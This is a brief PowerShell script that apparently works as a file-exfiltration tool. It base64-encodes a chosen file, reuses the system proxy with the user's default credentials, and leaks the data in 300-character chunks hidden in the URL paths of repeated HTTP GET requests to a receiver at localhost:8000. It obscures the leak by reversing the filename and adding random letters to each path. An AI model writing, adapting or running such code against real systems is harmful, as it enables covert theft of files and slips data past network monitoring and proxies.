$filename = $args[0] 
if (!$filename) { $filename = Read-Host -Prompt 'Enter your filename (including extension if exists)' }
$filecontent = Get-Content $filename 
$finalData =[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename))

$proxy = [System.Net.WebRequest]::GetSystemWebproxy()
$proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials


$finalData = $finalData -split '(\S{300})' | ? {$_}

$emanelif = -join $filename[-1..-$filename.Length]

Invoke-WebRequest -Uri http://localhost:8000/search?q=/$emanelif

foreach ($num in $finalData) {
Get-Random -Count 1 -InputObject (97..122) | % -begin {$randomchar=$null} -process {$randomchar += [char]$_}  
$uri = "http://localhost:8000/$randomchar/$num "
$Response = Invoke-WebRequest -Uri $uri
 }
